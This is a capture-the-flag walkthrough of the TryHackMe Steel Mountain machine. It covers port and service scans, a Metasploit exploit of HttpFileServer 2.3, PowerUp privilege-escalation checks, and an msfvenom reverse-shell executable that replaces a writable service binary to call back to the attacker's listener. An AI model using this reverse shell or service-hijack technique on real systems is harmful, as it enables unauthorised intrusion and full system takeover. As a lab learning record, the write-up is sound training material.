# enumerate
- port
```
port scanning...
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
8080/tcp  open  http-proxy
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49159/tcp open  unknown
49161/tcp open  unknown
Enumerating open ports...
```
- services
```
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2020-07-19T14:23:37+00:00; +1s from scanner time.
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
49161/tcp open  msrpc              Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 (96%), Microsoft Windows Server 2012 R2 (96%), Microsoft Windows Server 2012 R2 Update 1 (96%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (96%), Microsoft Windows Server 2012 or Server 2012 R2 (95%), Microsoft Windows Vista SP1 (95%), Microsoft Windows Server 2008 SP2 Datacenter Version (94%), Microsoft Windows Server 2008 R2 (93%), Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (93%), Microsoft Windows Server 2008 SP1 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:5f:11:43:b6:98 (unknown)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-07-19T14:23:31
|_  start_date: 2020-07-19T14:11:43
```
- smb : cant login anonymous
- port 80 using gobuster: just Bill Harper here, he is a cute dude who love cat
```
/Index.html (Status: 200)
/img (Status: 301)
/index.html (Status: 200)
```
- port 8080 : HttpFileServer httpd 2.3
  - cant login with common password
  - https://www.exploit-db.com/exploits/39161

# with Metasploit

# Foothold
The is a metasploit module for this exploit, open `msfconsole` and run `search hfs`. Select the exploit and fill every requried varible in the `options`. Execute the exploit when you are done.

# Root
we will use `PowerUp.ps1` to find a potential priv esc vector. `PowerUp` purpose is to evaluate a Windows machine and determine any abnormalities - "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."

let find out `PowerUP`:
```console
kali@kali:~$ find / -name PowerUp.ps1 2> /dev/null
```
To execute this using Meterpreter, I will type ```load powershell``` into meterpreter to load the extension. Then enter powershell by execute ```powershell_shell``` then execute the script
```
meterpreter > upload /home/kali/Empire/data/module_source/privesc/PowerUp.ps1
[*] uploading  : /home/kali/Empire/data/module_source/privesc/PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 550.06 KiB of 550.06 KiB (100.0%): /home/kali/Empire/data/module_source/privesc/PowerUp.ps1 -> PowerUp.ps1
[*] uploaded   : /home/kali/Empire/data/module_source/privesc/PowerUp.ps1 -> PowerUp.ps1
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks
.
.
.
[*] Checking service executable and argument permissions...


ServiceName                     : AdvancedSystemCareService9
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart                      : True
.
.
.
```
note that we have premission to **restart** this service, moreover, the directory to the application is also **write-able**. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!


now let create msfvenom reverse shell read [here](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/). We will replace the service which call ```ASCService.exe```, in Kali:
```console
kali@kali:~/THM/steel$ msfvenom -p windows/shell_reverse_tcp LHOST=10.8.14.151 LPORT=6969 -e x86/shikata_ga_nai -f exe -o ASCService.exe
```
back to meterpreter. upload the shell
```
meterpreter > cd C:/Users/bill/Desktop
meterpreter > upload /home/kali/THM/steel/ASCService.exe
[*] uploading  : /home/kali/THM/steel/ASCService.exe -> ASCService.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /home/kali/THM/steel/ASCService.exe -> ASCService.exe
[*] uploaded   : /home/kali/THM/steel/ASCService.exe -> ASCService.exe
meterpreter > 
```
now load powershell again, we will stop the service -> replace our reverse shell with the real `ASCService.exe` -> start up the service again
```
meterpreter > powershell_shell 
PS > Stop-Service -Name "AdvancedSystemCareService9"
PS > Copy-Item "ASCService.exe" -Destination "C:\Program Files (x86)\IObit\Advanced SystemCare\"
PS > Start-Service -Name "AdvancedSystemCareService9"
```
**NOTE** before start the service back up dont forget to `netcat` and listen for the port. Now run `more root.txt` to get root flag


# without MSF
im lazy read [here](https://www.cybersecpadawan.com/2020/04/tryhackme-steel-mountain-metasploit-and.html)